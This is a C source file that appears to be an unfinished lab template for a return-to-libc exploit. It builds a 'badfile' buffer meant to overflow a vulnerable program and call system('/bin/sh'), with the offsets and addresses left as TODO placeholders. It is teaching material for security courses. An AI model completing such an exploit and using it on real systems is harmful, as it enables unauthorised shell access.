/* return_to_libc.c  */

/* A program that creates a file to jump to libc and execute shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void main(int argc, char **argv)
{
	char buffer[512];
	FILE *badfile;

	/* Initialize buffer*/
	memset(&buffer, 0x00, sizeof(buffer));

	/* TODO: Fill initial buffer values. You need to make
	   buffer values non-zero so that string copy overflows */
	


	/* TODO: Set the buffer at locations X, Y, and Z. The order 
	   of the following three statements does not imply the
	   order of X, Y, and Z. Actually, we intentionally 
	   scrambled the order. */
	
	*(long *) &buffer[X] = 0; // address of "/bin/sh"
	*(long *) &buffer[Y] = 0; // address of system()
	*(long *) &buffer[Z] = 0; // address of exit()

	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, sizeof(buffer), 1, badfile);
	fclose(badfile);
}
